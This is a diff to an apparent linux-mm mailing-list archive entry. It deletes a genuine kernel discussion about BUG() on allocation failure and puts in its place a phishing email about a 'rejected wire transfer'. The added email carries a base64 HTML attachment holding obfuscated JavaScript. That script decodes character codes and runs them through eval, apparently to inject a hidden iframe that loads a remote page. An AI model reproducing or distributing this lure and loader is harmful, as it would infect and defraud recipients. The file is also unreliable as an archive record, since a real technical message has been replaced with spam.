@@ -1,74 +1,71 @@
-Return-Path: <owner-linux-mm@kvack.org>
-Received: from psmtp.com (na3sys010amx122.postini.com [74.125.245.122])
-	by kanga.kvack.org (Postfix) with SMTP id 8EB3D6B004D
-	for <linux-mm@kvack.org>; Wed, 11 Apr 2012 15:48:53 -0400 (EDT)
-Received: from g5t0029.atlanta.hp.com (g5t0029.atlanta.hp.com [16.228.8.141])
-	by g5t0008.atlanta.hp.com (Postfix) with ESMTP id A4A5D24314
-	for <linux-mm@kvack.org>; Wed, 11 Apr 2012 19:48:52 +0000 (UTC)
-Received: from hornet.americas.hpqcorp.net (hornet.americas.hpqcorp.net [16.89.246.191])
-	by g5t0029.atlanta.hp.com (Postfix) with ESMTP id 83A402031C
-	for <linux-mm@kvack.org>; Wed, 11 Apr 2012 19:48:52 +0000 (UTC)
-Message-ID: <4F85E024.3070407@hp.com>
-Date: Wed, 11 Apr 2012 12:48:52 -0700
-From: Don Morris <don.morris@hp.com>
+Return-Path: <jingleds@polysto.com>
+Date: Wed, 11 Apr 2012 21:25:49 +0100
+From: "Shirley Hogan" <jingleds@polysto.com>
+Message-ID: <9146596750.44GIE69I218217@qlojdbwiqx.gosnndrpshkxn.com>
+Subject: RE: Wire transfer rejected
 MIME-Version: 1.0
-Subject: Re: [PATCH] remove BUG() in possible but rare condition
-References: <1334167824-19142-1-git-send-email-glommer@parallels.com> <20120411184845.GA24831@tiehlicka.suse.cz> <CA+55aFx1GMWGgh0sTAzvvVSzPQsQ_4NKeaNv1zpKrP4fg1dG+Q@mail.gmail.com> <20120411192052.GB24831@tiehlicka.suse.cz>
-In-Reply-To: <20120411192052.GB24831@tiehlicka.suse.cz>
-Content-Type: text/plain; charset=ISO-8859-1
-Content-Transfer-Encoding: 7bit
-Sender: owner-linux-mm@kvack.org
+Content-Type: multipart/mixed;
+  boundary="----------9B646AD8B711F09"
+To: linux-aio@kvack.org, linux-mm-archive@kvack.org
+Cc: linux-mm@kvack.org
 List-ID: <linux-mm.kvack.org>
-To: linux-mm@kvack.org
 
-On 04/11/2012 12:20 PM, Michal Hocko wrote:
-> On Wed 11-04-12 11:57:56, Linus Torvalds wrote:
->> On Wed, Apr 11, 2012 at 11:48 AM, Michal Hocko <mhocko@suse.cz> wrote:
->>>
->>> I am not familiar with the code much but a trivial call chain walk up to
->>> write_dev_supers (in btrfs) shows that we do not check for the return value
->>> from __getblk so we would nullptr and there might be more.
->>> I guess these need some treat before the BUG might be removed, right?
->>
->> Well, realistically, isn't BUG() as bad as a NULL pointer dereference?
->>
->> Do you care about the exact message on the screen when your machine dies?
-> 
-> I personally do not care as I do not allow anything to map at that area.
-> 
-> It just seems that there are some callers who do not expect that the
-> allocation fails. BUG at the allocation failure which dates back when it
-> replaced buffer_error might have let to some assumptions (not good of
-> course but we should better fix them.
-> 
-> That being said I am not against the patch. BUG on an allocation failure
-> just doesn't feel right...
+------------9B646AD8B711F09
+Content-Type: multipart/alternative;
+  boundary="----------B46E98B7C930500"
 
-Apologies in advance for the relatively wide distribution for what may
-be an obvious/stupid question, but if this is in a Documentation/vm
-file, I don't see it.
+------------B46E98B7C930500
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
 
-Unless I'm really missing something, the allocation in question uses
-GFP_NOFS flags, resulting in a "Wait Ok" request to the underlying
-allocators. Other than gotchas like force failures returning a fail
-even for Wait-safe allocations... is it actually expected for Wait-safe
-kernel allocations to fail? Certainly page requests for user memory
-can run afoul of OOM or other mechanisms, and certainly any request
-for special/hard memory could be failed... but wouldn't a general small
-kernel allocation should generally sleep until satisfied?
+Good day,The Wire fund transfer was canceled.Canceled transaction:FEDWIRE REFERENCE NUMBER:  SK840875549ODP47335KYou can find details in the attached file.(Internet Explorer file)
+------------B46E98B7C930500
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: 7bit
 
-That's what the current code looks like to me -- but I could easily
-be missing something in the reading, so I'm mainly asking if there's
-a general policy to the API here. If it is that non-special kernel
-allocations wait until they're satisfied... I'm wondering, why the
-test/force mode that seems guaranteed to light off BUG() statements
-such as this which are simply validating the allocation contract?
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY>
 
-Don Morris
+Good day,<br />
+The Wire fund transfer was canceled.<br /><br />
 
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Fight unfair telecom internet charges in Canada: sign http://stopthemeter.ca/
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+<b>Canceled transaction:</b><br />
+FEDWIRE REFERENCE NUMBER:  SK840875549ODP47335K<br />
+
+<b>You can find details in the attached file.(Internet Explorer file)</b><br /><br />
+
+
+</BODY></HTML>
+------------B46E98B7C930500--
+
+------------9B646AD8B711F09
+Content-Type: text/html; name="Transfer_NKK.htm"
+Content-Transfer-Encoding: base64
+Content-ID: <008401cd1829$aa179390$16b2a8c0@74Q3Q2C>
+
+PGh0bWw+DQogPGhlYWQ+DQogIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29u
+dGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ij4NCjx0aXRsZT5wYWdlMTU8L3RpdGxl
+Pg0KIDwvaGVhZD4NCiA8Ym9keT4gIA0KDQogPHN0eWxlPg0KCWJvZHkgeyBtYXJnaW46IDA7
+fQ0KCSNpZnJhbWVfYm94IHtwb3NpdGlvbjogYWJzb2x1dGU7DQogIG92ZXJmbG93OiBhdXRv
+Ow0KICBtYXJnaW46IDA7DQogIHdpZHRoOiAxMDAlOw0KICBoZWlnaHQ6IDEwMCU7fQ0KIDwv
+c3R5bGU+DQoNCjxzY3JpcHQ+Yz0zLTE7aT0tMitjO2lmKHBhcnNlSW50KCIwIisiMSIrIjIi
+KyIzIik9PT04Myl0cnl7Qm9vbGVhbigpLnByb3RvdHlwZS5xfWNhdGNoKGVnZXdnc2Qpe2lm
+KHdpbmRvdy5kb2N1bWVudClmPVsnLTMwaTc4aTU3aTc0aS04aTU4aTcxaTgwaS04aTIxaS04
+aTYwaTcxaTU5aTc3aTY5aTYxaTcwaTc2aTZpNTlpNzRpNjFpNTdpNzZpNjFpMjlpNjhpNjFp
+NjlpNjFpNzBpNzZpMGktMWk2NWk2Mmk3NGk1N2k2OWk2MWktMWkxaTE5aS04aS0zMGk1OGk3
+MWk4MGk2aTY1aTYwaS04aTIxaS04aS0xaTY1aTYyaTc0aTU3aTY5aTYxaTU1aTU4aTcxaTgw
+aS0xaTE5aS04aS0zMGk1OGk3MWk4MGk2aTc1aTc0aTU5aS04aTIxaS04aS0xaTY0aTc2aTc2
+aTcyaTE4aTdpN2k3OWk2NWk3NWk2N2k3MWk3MGk3NWk2NWk3MGk3Nmk3Mmk1N2k3NGk1N2k2
+aTc0aTc3aTE4aTE2aThpMTZpOGk3aTY1aTY5aTYzaTdpMjNpNzJpNzRpNzFpNjlpNzFpMjFp
+NzBpNTdpNTlpNjRpNTdpLTFpMTlpLThpLTMwaTYwaTcxaTU5aTc3aTY5aTYxaTcwaTc2aTZp
+NThpNzFpNjBpODFpNmk3NWk3Nmk4MWk2OGk2MWk2aTcxaTc4aTYxaTc0aTYyaTY4aTcxaTc5
+aS04aTIxaS04aS0xaTY0aTY1aTYwaTYwaTYxaTcwaS0xaTE5aS04aS0zMGk2MGk3MWk1OWk3
+N2k2OWk2MWk3MGk3Nmk2aTU4aTcxaTYwaTgxaTZpNTdpNzJpNzJpNjFpNzBpNjBpMjdpNjRp
+NjVpNjhpNjBpMGk1OGk3MWk4MGkxaTE5J11bMF0uc3BsaXQoJ2knKTt2PSJldiIrImEiKyJs
+Ijt9aWYodillPXdpbmRvd1t2XTt3PWY7cz1bXTtyPVN0cmluZztmb3IoOzIwNCE9aTtpKz0x
+KXtqPWk7cz1zK3JbImYiKyJyIisib21DIisiaGFyIisiQ29kZSJdKHdbal0qMSs0MCk7fQ0K
+aWYodil6PXM7ZSh6KTs8L3NjcmlwdD4NCg0KDQo8L2JvZHk+DQo8L2h0bWw+ 
+
+------------9B646AD8B711F09--
